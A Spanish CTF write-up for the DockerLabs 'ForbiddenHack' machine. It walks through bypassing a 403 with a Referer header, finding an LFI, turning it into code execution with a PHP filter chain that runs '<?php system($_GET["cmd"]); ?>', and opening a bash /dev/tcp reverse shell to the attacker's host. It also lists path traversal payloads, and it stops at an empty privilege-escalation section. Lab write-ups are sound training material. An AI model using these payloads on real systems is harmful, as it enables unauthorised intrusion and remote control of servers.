
# Writeup Template: Maquina `[ ForbideenHack ]`

- Tags: #ForbiddenHack #Bypass
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina ForbiddenHack](https://mega.nz/file/bMUEgKDQ#6tXvq8HYxEkyJ3oQTz07uc7yxRrCyJ88_ZZhAmQpZz0) Bypass código de estado 403 y explotación de LFI con Wrapper.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x forbiddenhack.zip
sudo bash auto_deploy.sh forbiddenhack.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Analisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```

Revisando el codigo fuente tenemos esta linea:
```bash
You should <b>replace this file</b> (located at<tt>/var/www/bypass403.pw/index.php</tt>) before continuing to operate your HTTP server.
```

asi que agregamos este linea a nuestro archivo: **( /etc/hosts )**
```bash
172.17.0.2 bypass403.pw
```
### Tecnologias Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://bypass403.pw
http://bypass403.pw [403 Forbidden] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[403 Forbidden]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 bypass403.pw # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://bypass403.pw -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash -k
```

**Hallazgos Relevantes:**
	No reporta nada critico ya que estamos nos reporta un codigo de estado:
	**403** Forbidden, No tenemos permiso para acceder a ese recurso
	**403 Forbidden** indica que el servidor entiende la solicitud, pero **rechaza el acceso**

### Descubrimiento de Archivos
```bash
gobuster dir -u http://bypass403.pw -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,pl -k
```

- **Hallazgos**:
	No podemos enumerar por archivos de igual manera:
## Explotacion de Vulnerabilidades
### Vector de Ataque
Realizaremos un ataque de tipo `ByPass` Un **ataque de bypass** (o **evasión de controles de acceso**) es una técnica utilizada en seguridad informática para **eludir mecanismos de protección**, como firewalls, sistemas de autenticación o restricciones de acceso. En el contexto de un error **HTTP 403 Forbidden**, el objetivo es acceder a recursos bloqueados (archivos, directorios, endpoints) que el servidor protege intencionalmente.

## Burpsuite `BypassAttack`:
usaremso burpsuite para interceptar la peticion y ver como es que se estas tramitando la peticion:
```bash
burpsuite &>/dev/null & disown
```

Una ves interceptada la peticion sobre esta url:
```bash
http://bypass403.pw/
```

**Intercept > HTTP history** Recargamos para ver como es que se esta enviando la peticion:
```bash
GET / HTTP/1.1
Host: bypass403.pw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Esto lo mandaremos al **modoRepeater**
Ya en el modo repeater le damos: **( ctrl + barra espaciadora )** para enviar la peticion.
Nos responde con un codigo de estado **403**
```bash
HTTP/1.1 403 Forbidden
Date: Sat, 14 Jun 2025 18:44:44 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 277
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at bypass403.pw Port 80</address>
</body></html>
```

Para **bypassear** solo me funciono con esta referencia:
Agregamos: **( Referer: http://bypass403.pw/ )** Con el objetivo de enganar al servidor para que piense que la peticion viene de el mismo

###### Peticion
**( ctrl + space )** Enviamos la peticion asi:
```bash
GET / HTTP/1.1
Host: bypass403.pw
Referer: http://bypass403.pw/index.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

###### Respuesta:
Ahora en la respuesta obtenemos un codigo de estado: **( 200OK )** lo que significa que hemos logrado evadir el **403 Forbidden**
```bash
HTTP/1.1 200 OK
Date: Sat, 14 Jun 2025 18:51:38 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1192
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Ahora si realizamos esta peticion con el comando **curl** desde terminal:
**-H** Envia como cabecera la referencia: **Referer** 
```bash
 curl -k "http://bypass403.pw/index.php" -H "Referer: http://bypass403.pw/index.php"
```

Obtenemos la siguiente respuesta exitosa:
```html
<!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>403 Forbidden Conseguido!</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #1e1e1e;
                color: #f1f1f1;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
            }
            .container {
                text-align: center;
            }
            .flag {
                font-size: 1.5rem;
                margin-top: 20px;
                background: #111;
                padding: 15px;
                border: 2px dashed #0f0;
                color: #0f0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>  By d1se0</h1>
            <p>Nadie que este autorizado puede visualizar esta pagina, lo tenemos protegido con un 403 Forbidden.</p>
            <p>Explorar lo es todo, piensa y explora.</p>
            <div class="flag">Cuantos secretos guarda esta web...</div>
        </div>
    </body>
    </html>
```

###### Fuzzeando parametros:
Realizaremos un ataque de **fuzzing** para encontrar si existe algun parametro en la consulta **php**
```bash
wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://bypass403.pw/index.php?FUZZ=/etc/passwd" -H "Referer: http://bypass403.pw/index.php" --hl=38
```

Tenemos un parametro:
```bash
000000174:   200        19 L     21 W       888 Ch      "pages"
```

Ahora tenemos que ver si podemos derivarlo a un **LFI** para que puedamos leer archivos internos del sistema:
```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://bypass403.pw/index.php?pages=FUZZ" -H "Referer: http://bypass403.pw/index.php" --hl=0
```

Obtenemos lo siguiente que tendremos que pobrar para ir descartando los que no sirven:
```bash
 "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                         
 "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"            
 "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passw
 "/etc/apache2/apache2.conf"                                                      
 "/etc/fstab"                                                                     
 "/etc/group"                                                                     
 "/etc/apt/sources.list"                                                          
 "/etc/hosts"                                                                     
 "../../../../../../../../../../../../etc/hosts"                                  
 "../../../../../../../../../../../../../../../../../../etc/passwd"               
 "../../../../../../../../../../../../etc/passwd"                                 
 "../../../../../../../../../../../etc/passwd"                                    
 "../../../../../../../../../../../../../etc/passwd"                              
 "../../../../../../../../../../../../../../etc/passwd"                           
 "../../../../../../../../../../../../../../../../../../../etc/passwd"            
 "../../../../../../../../../../../../../../../../../etc/passwd"                  
 "../../../../../../../../../../../../../../../../etc/passwd"                     
 "../../../../../../../../../../../../../../../../../../../../etc/passwd"         
 "../../../../../../../../../../../../../../../etc/passwd"                        
 "../../../../../../../../../../../../../../../../../../../../../etc/passwd"      
 "/etc/passwd"                                                                    
 "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"   
 "/./././././././././././etc/passwd"                                              
 "/etc/nsswitch.conf"                                                             
 "/../../../../../../../../../../etc/passwd"                                      
 "/etc/issue"                                                                     
 "/etc/init.d/apache2"                                                            
 "../../../../../../../../../../etc/passwd"                                       
 "../../../../etc/passwd"                                                         
 "../../../../../../../../etc/passwd"                                             
 "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                     
 "../../../../../etc/passwd"                                                      
 "../../../etc/passwd"                                                            
 "../../../../../../../../../etc/passwd"                                          
 "../../../../../../etc/passwd"                                                   
 "../../../../../../../etc/passwd"                                                
 "/etc/rpc"                                                                       
 "/etc/resolv.conf"                                                               
 "/proc/meminfo"                                                                  
 "/proc/version"                                                                  
 "/proc/self/status"                                                              
 "/proc/partitions"                                                               
 "/proc/net/route"                                                                
 "/proc/loadavg"                                                                  
 "/proc/mounts"                                                                   
 "/proc/net/arp"                                                                  
 "/proc/net/dev"                                                                  
 "/proc/cpuinfo"                                                                  
 "/proc/net/tcp"                                                                  
 "///////../../../etc/passwd"                                                     
```

Probamos el siguiente comando para leer el contenido del archivo: **passwd**
```bash
curl -k "http://bypass403.pw/index.php?pages=/etc/passwd" -H "Referer: http://bypass403.pw/index.php"
```

Vemos el contenido:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
bambi:x:1001:1001:bambi,,,:/home/bambi:/bin/bash
```

Ahora sabiendo que tenemos estos dos usuarios en el sistema:
```bash
root:x:0:0:root:/root:/bin/bash
bambi:x:1001:1001:bambi,,,:/home/bambi:/bin/bash
```

### Uso `php_filter_chain_generator.py`
Ahora que tenemos un **LFI** tenemos que derivarlo a un **RCE** con esta herramienta: `php_filter_chain_generator.py` 
**PHP Filter Chain Generator** es una herramienta diseñada para explotar vulnerabilidades de **Local File Inclusion (LFI)** convirtiéndolas en **ejecución remota de comandos (RCE)**. Su función principal es generar cadenas de filtros PHP (`php://filter`) que transforman el contenido de un archivo legible (como `/etc/passwd`) en código PHP malicioso mediante manipulaciones de codificación.

**Nota** Asi se instala en caso de que no lo tengamos:
```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
```

Ahora crearemos el **payload** que nos permita realizar una llamada a nivel de sistema para ejecutar un comando:
```bash
php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

**Nota** como el **output** final contiene cadenas en binario tendremos que agregar al final el siguiente parametro:
curl está advirtiendo que la respuesta contiene **datos binarios** que podrían desordenar tu terminal. Esto es común cuando se explota LFI con PHP Filter Chains, ya que la respuesta puede contener contenido codificado o ejecutable.
**temp&cmd=id** Aqui estamos indicando que queremos que se ejecute este comando
**--output response.html** Esto nos permite guardar en contenido en un archivo **html** para que funcione de manera correcta quedando asi el comando:

Ejecutamos todo este comando:
```bash
curl -k "http://bypass403.pw/index.php?pages=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=id" -H "Referer: http://bypass403.pw/index.php" --output response.html
```

Obtendremos un **output** de salida como el siguiente que indica que se a ejecutado correctamente:
```bash
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   273  100   273    0     0  27253      0 --:--:-- --:--:-- --:--:-- 30333
```

Ahora tenemos un archivo: **response.html** que si vemos su contenido, Tenemos ejecucion remota de comandos de manera exitosa:
```bash
cat response.html

uid=33(www-data) gid=33(www-data) groups=33(www-data) # Outpud del comando id
)C^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^OC�^C�^C��^@^@=^O�^O@^OC�^C�^C��^@�^@�>^@=^@=^O�^O@^O
```

### Intrusion
Para ganar aceeso a la maquina nos pones en escucha en nuestra maquina de atacante:
```bash
nc -nlvp 443
```

**Nota** para que funcione correctamente y ganemos accesso a la maquina victima, tendremo que ejecutar este comando primero en la misma terminar donde hemos ejecutado el primer comando **id**, Esto porque llamaremos a una variable que crearemos con el siguiente comando:
Esto lo hacemos porque al ejecutar directamente la **revershell** da problemas entonces lo que aremos sera acortarla mediante una variable que es a la que despues llamaremos al final para ganar acceso a la maquina victima:

El error `curl: (3) URL rejected: Malformed input to a URL function` ocurre porque la URL es **demasiado larga** y contiene caracteres especiales que deben ser escapados correctamente. El comando `bash -i >%26 ...` tiene caracteres como `>` y `&` que necesitan codificación URL completa.
```bash
COMANDO_CODIFICADO=$(echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" | jq -sRr @uri)
```

en **bash** sabemos que para llamar a una variabale es de esta manera:
```bash
$COMANDO_CODIFICADO
```

##### Ganando accesso:
Ejecutamos:
```bash
# Reverse shell o acceso inicial con la variable $COMANDO_CODIFICADO ya incluido
curl -k "http://bypass403.pw/index.php?pages=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=$COMANDO_CODIFICADO" -H "Referer: http://bypass403.pw/index.php"
```

**Nota** Al codificar completamente el comando y asegurar que la URL no tenga caracteres especiales sin escape, solucionas el error de "Malformed input". La conexión inversa debería establecerse correctamente

---
## Escalada de Privilegios
### Enumeracion del Sistema

**Hallazgos Clave:**
En la siguiete ruta tenemos lo siguiete:
```bash
/home/bambi/.secret/interestingSecret.txt
```
### Explotacion de Privilegios

